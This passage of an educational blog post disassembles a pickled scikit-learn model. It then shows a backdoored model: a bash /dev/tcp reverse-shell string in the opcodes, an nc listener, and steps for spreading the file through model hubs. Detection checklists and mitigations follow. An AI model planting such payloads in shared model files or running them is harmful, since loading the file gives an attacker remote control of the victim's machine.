</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>58</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 1)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>59</span><span class=p>:</span><span class=w> </span><span class=l>\x93 STACK_GLOBAL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>60</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 2)</span><span class=w>
</span></span></span></code></pre></div><ul><li>The pickle stream begins by storing the class path <code>'sklearn.linear_model._base'</code> and the class name <code>'LinearRegression'</code>.</li><li>The <code>STACK_GLOBAL</code> opcode (<code>\x93</code>) constructs the <code>LinearRegression</code> class.</li><li>At this stage, the object is not yet initialized, just referenced.</li></ul><h4 class="relative group">2. Creating the Object<div id=2-creating-the-object class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2-creating-the-object aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>61</span><span class=p>:</span><span class=w> </span><span class=l>)    EMPTY_TUPLE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>62</span><span class=p>:</span><span class=w> </span><span class=l>\x81 NEWOBJ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>63</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 3)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>64</span><span class=p>:</span><span class=w> </span>}<span class=w>    </span><span class=l>EMPTY_DICT</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>65</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 4)</span><span class=w>
</span></span></span></code></pre></div><ul><li><code>EMPTY_TUPLE</code> (<code>\x61</code>): No constructor arguments (<code>LinearRegression()</code> has default parameters).</li><li><code>NEWOBJ</code> (<code>\x81</code>): Calls the class constructor.</li><li>An empty dictionary (<code>{}</code>) is allocated to store the object&rsquo;s attributes.</li></ul><h4 class="relative group">3. Storing Model Parameters<div id=3-storing-model-parameters class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#3-storing-model-parameters aria-label=Anchor>#</a></span></h4><p>The pickle file then stores key attributes of the <code>LinearRegression</code> model.</p><h5 class="relative group">3.1 Model Hyperparameters<div id=31-model-hyperparameters class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#31-model-hyperparameters aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=w>  </span><span class=nt>67</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;fit_intercept&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>82</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 5)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>83</span><span class=p>:</span><span class=w> </span><span class=l>\x88 NEWTRUE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>84</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;normalize&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>95</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 6)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>96</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;deprecated&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>108</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 7)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>109</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;copy_X&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>117</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 8)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>118</span><span class=p>:</span><span class=w> </span><span class=l>\x88 NEWTRUE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>119</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;n_jobs&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>127</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 9)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>128</span><span class=p>:</span><span class=w> </span><span class=kc>N</span><span class=w> </span><span class=l>NONE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>129</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;positive&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>139</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 10)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>140</span><span class=p>:</span><span class=w> </span><span class=l>\x89 NEWFALSE</span><span class=w>
</span></span></span></code></pre></div><ul><li><code>fit_intercept=True</code></li><li><code>normalize=deprecated</code> (this was removed in <code>sklearn>=0.24</code>)</li><li><code>copy_X=True</code></li><li><code>n_jobs=None</code></li><li><code>positive=False</code></li></ul><h5 class="relative group">3.2 Number of Features<div id=32-number-of-features class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#32-number-of-features aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>141</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;n_features_in_&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>157</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 11)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>158</span><span class=p>:</span><span class=w> </span><span class=l>K BININT1    1</span><span class=w>
</span></span></span></code></pre></div><ul><li>Stores <code>n_features_in_ = 1</code>, meaning the model was trained on a single feature.</li></ul><h5 class="relative group">3.3 Model Coefficients (<code>coef_</code>)<div id=33-model-coefficients-coef_ class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#33-model-coefficients-coef_ aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>160</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;coef_&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>167</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 12)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>168</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;numpy.core.multiarray&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>191</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 13)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>192</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;_reconstruct&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>206</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 14)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>207</span><span class=p>:</span><span class=w> </span><span class=l>\x93 STACK_GLOBAL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>208</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 15)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>209</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;numpy&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>216</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 16)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>217</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;ndarray&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>226</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 17)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>227</span><span class=p>:</span><span class=w> </span><span class=l>\x93 STACK_GLOBAL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>228</span><span class=p>:</span><span class=w> </span><span class=l>\x94 MEMOIZE    (as 18)</span><span class=w>
</span></span></span></code></pre></div><ul><li>Stores the NumPy array representing <code>coef_</code>.</li><li>The <code>coef_</code> array is reconstructed using NumPy’s <code>_reconstruct</code> method.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> 233: C SHORT_BINBYTES b<span class=s1>&#39;b&#39;</span>
</span></span></code></pre></div><ul><li><code>b'b'</code> represents the byte-encoded coefficient value.</li></ul><h5 class="relative group">3.4 Singular Values & Rank (For Least Squares Solution)<div id=34-singular-values--rank-for-least-squares-solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#34-singular-values--rank-for-least-squares-solution aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl> <span class=m>321</span><span class=p>:</span> <span class=err>\</span><span class=n>x8c</span> <span class=n>SHORT_BINUNICODE</span> <span class=err>&#39;</span><span class=n>singular_</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl> <span class=m>332</span><span class=p>:</span> <span class=err>\</span><span class=n>x94</span> <span class=n>MEMOIZE</span>    <span class=p>(</span><span class=k>as</span> <span class=m>34</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>Stores singular values from the least squares solution.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> 357: C SHORT_BINBYTES b<span class=s1>&#39;\xcd;\x7ff\x9e\xa0\xf6?&#39;</span>
</span></span></code></pre></div><ul><li>Stores a floating-point singular value.</li></ul><h5 class="relative group">3.5 Model Intercept (<code>intercept_</code>)<div id=35-model-intercept-intercept_ class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#35-model-intercept-intercept_ aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl> <span class=m>371</span><span class=p>:</span> <span class=err>\</span><span class=n>x8c</span> <span class=n>SHORT_BINUNICODE</span> <span class=err>&#39;</span><span class=n>intercept_</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl> <span class=m>383</span><span class=p>:</span> <span class=err>\</span><span class=n>x94</span> <span class=n>MEMOIZE</span>    <span class=p>(</span><span class=k>as</span> <span class=m>41</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>Stores the intercept term.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> 399: C SHORT_BINBYTES b<span class=s1>&#39;\x00\x00\x00\x00\x00\x00\xd0&lt;&#39;</span>
</span></span></code></pre></div><ul><li>The raw byte representation of the intercept value.</li></ul><h4 class="relative group">4. Storing Scikit-Learn Version<div id=4-storing-scikit-learn-version class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#4-storing-scikit-learn-version aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w> </span><span class=n>414</span><span class=p>:</span><span class=w> </span><span class=err>\</span><span class=n>x8c</span><span class=w> </span><span class=n>SHORT_BINUNICODE</span><span class=w> </span><span class=err>&#39;</span><span class=n>_sklearn_version</span><span class=err>&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=n>432</span><span class=p>:</span><span class=w> </span><span class=err>\</span><span class=n>x94</span><span class=w> </span><span class=nf>MEMOIZE</span><span class=w>    </span><span class=p>(</span><span class=n>as</span><span class=w> </span><span class=n>47</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=n>433</span><span class=p>:</span><span class=w> </span><span class=err>\</span><span class=n>x8c</span><span class=w> </span><span class=n>SHORT_BINUNICODE</span><span class=w> </span><span class=err>&#39;</span><span class=n>1</span><span class=p>.</span><span class=na>1</span><span class=p>.</span><span class=na>3</span><span class=err>&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=n>440</span><span class=p>:</span><span class=w> </span><span class=err>\</span><span class=n>x94</span><span class=w> </span><span class=nf>MEMOIZE</span><span class=w>    </span><span class=p>(</span><span class=n>as</span><span class=w> </span><span class=n>48</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><ul><li>This records the Scikit-learn version used when the model was trained (<code>1.1.3</code>).</li><li>This helps with compatibility checks during unpickling.</li></ul><h4 class="relative group">5. Finalizing Object Construction<div id=5-finalizing-object-construction class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#5-finalizing-object-construction aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>441</span><span class=p>:</span><span class=w> </span><span class=l>u SETITEMS   (MARK at 66)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>442</span><span class=p>:</span><span class=w> </span><span class=l>b BUILD</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>443</span><span class=p>:</span><span class=w> </span><span class=l>. STOP</span><span class=w>
</span></span></span></code></pre></div><ul><li><code>SETITEMS</code> (<code>u</code>) assigns all the stored attributes (<code>coef_</code>, <code>intercept_</code>, <code>fit_intercept</code>, etc.) to the <code>LinearRegression</code> object.</li><li><code>BUILD</code> (<code>b</code>) completes the object reconstruction.</li><li><code>STOP</code> (<code>.</code>) signals the end of the pickle file.</li></ul><h2 class="relative group">Injecting a Backdoor into an AI Model<div id=injecting-a-backdoor-into-an-ai-model class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#injecting-a-backdoor-into-an-ai-model aria-label=Anchor>#</a></span></h2><p>AI models are being shared everywhere—on Hugging Face, Kaggle, and GitHub—making it easy for developers to use and improve them. Now, imagine a backdoored AI model—one that not only performs its advertised ML task but also executes a hidden reverse shell when unpickled.</p><h3 class="relative group">Crafting a malicious payload<div id=crafting-a-malicious-payload class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#crafting-a-malicious-payload aria-label=Anchor>#</a></span></h3><p><figure><img class="my-0 rounded-md" loading=lazy src=/images/b2_exploit.png alt="Sample payload"></figure>This code <strong>initiates a reverse shell</strong> when unpickled, establishing a <strong>TCP connection</strong> to an attacker’s machine. This allows remote command execution on the victim’s system. If injected into an <strong>AI model</strong> and shared on public repositories, unsuspecting users could unknowingly <strong>compromise their devices</strong>.</p><h4 class="relative group">How an Attacker Could Exploit This<div id=how-an-attacker-could-exploit-this class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#how-an-attacker-could-exploit-this aria-label=Anchor>#</a></span></h4><ol><li>Start a listener on their machine:<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp <span class=m>9001</span>
</span></span></code></pre></div></li><li>Distribute the malicious <code>.pkl</code> file via platforms like GitHub or Hugging Face.</li><li>Wait for a victim to load the model.</li><li>Obtain full remote access to the compromised machine.</li></ol><p>⚠️ <strong>Warning:</strong> This demonstration is for <strong>educational purposes only</strong> and underscores the dangers of untrusted pickle files.</p><h4 class="relative group">Disassembling the payload<div id=disassembling-the-payload class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#disassembling-the-payload aria-label=Anchor>#</a></span></h4><ul><li>Look for unexpected imports (<code>subprocess</code>, <code>os</code>, <code>Popen</code>, <code>eval</code>, <code>exec</code>, <code>socket</code>, <code>shutil</code>, <code>ctypes</code>, <code>multiprocessing</code>).</li><li>Check if <code>REDUCE</code>, <code>GLOBAL</code>, <code>NEWOBJ</code> call dangerous functions (e.g., <code>os.system</code>, <code>subprocess.Popen</code>, <code>eval</code>, <code>exec</code>).</li><li>Watch for shell commands (<code>/bin/bash</code>, <code>sh</code>, <code>cmd.exe</code>, <code>powershell.exe</code>).</li><li>Detect file system access (<code>open</code>, <code>os.remove</code>, <code>shutil.rmtree</code>, <code>os.chmod</code>, <code>os.unlink</code>).</li><li>Monitor for network activity (<code>socket</code>, <code>requests.get</code>, <code>urllib.request.urlopen</code>).</li><li>Watch for excessive memory usage (<code>bytearray(999999999)</code>, <code>b"\x00" * 999999999</code>).</li></ul><p>For the above payload, these are the opcodes which indicate security risk</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>154</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;subprocess&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>167</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;Popen&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>180</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;/bin/bash&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>192</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;-c&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>197</span><span class=p>:</span><span class=w> </span><span class=l>\x8c SHORT_BINUNICODE &#39;exec 5&lt;&gt;/dev/tcp/127.0.0.1/9001; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>286</span><span class=p>:</span><span class=w> </span><span class=l>R REDUCE</span><span class=w>
</span></span></span></code></pre></div><h2 class="relative group">Mitigation - Strategy<div id=mitigation---strategy class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#mitigation---strategy aria-label=Anchor>#</a></span></h2><h4 class="relative group">Layer 1: Attack Mitigation<div id=layer-1-attack-mitigation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#layer-1-attack-mitigation aria-label=Anchor>#</a></span></h4><ol><li>Prevent Poisoned Models & Untrusted Pickles<ul><li>Never unpickle files from untrusted sources.</li><li>Use safer alternatives like <strong>ONNX, SafeTensors, TorchScript</strong></li><li><strong>Disassemble and inspect</strong> pickle files using <code>pickletools.dis()</code>.</li></ul></li><li>AI Firewalls & Screening Tools</li><li>Defensive Training Techniques<ul><li>Distribute training across sub-models to reduce attack impact.</li><li>Automatic Patch Management</li></ul></li></ol><h4 class="relative group">Layer 2: Model Security<div id=layer-2-model-security class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#layer-2-model-security aria-label=Anchor>#</a></span></h4><ol><li>Explainable AI (XAI) & Continuous Validation<ul><li>Improve model transparency to <strong>detect security weaknesses early</strong>.</li><li>Conduct <strong>continuous testing</strong> to monitor evolving vulnerabilities.</li></ul></li><li>Restrict Arbitrary Code Execution<ul><li>Disable <code>__reduce__</code> and other serialization-related functions in untrusted models.</li><li>Use <strong>sandboxing techniques</strong> to execute models in <strong>isolated environments</strong> (Docker, VMs).</li></ul></li></ol><h4 class="relative group">Layer 3: Infrastructure Security<div id=layer-3-infrastructure-security class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#layer-3-infrastructure-security aria-label=Anchor>#</a></span></h4><ol><li><p>Access Control & Isolation</p><ul><li>Policy-Based Access Control (PBAC): Restrict unauthorized access at scale.</li><li>Network Segmentation**: Prevent attackers from escalating privileges across systems.</li></ul></li><li><p>Monitoring & Response</p><ul><li>Security Orchestration, Automation, and Response (SOAR): Automate real-time threat detection.</li><li>AI Observability & Logging: Continuously monitor for anomalous behavior in model execution.</li></ul></li></ol><p>As AI adoption accelerates, so do adversarial attacks targeting the ML supply chain. We must be prepared for these supply chain attacks and rethink how we store, share, and deploy machine learning models to ensure the security and integrity of our AI system</p><hr><p>[1] <a href=https://granica.ai/blog/ai-security-concerns-grc target=_blank>https://granica.ai/blog/ai-security-concerns-grc</a></p></div></div><script>var oid="views_posts/python-pickle.md",oid_likes="likes_posts/python-pickle.md"</script><script type=text/javascript src=/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q+oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/posts/data-infra/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">How we built a Scalable Data Platform</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-02-27T00:34:08+05:30>27 February 2025</time>
</span></span></a></span><span></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
JC</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://jchandra.com/ style=z-index:500><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>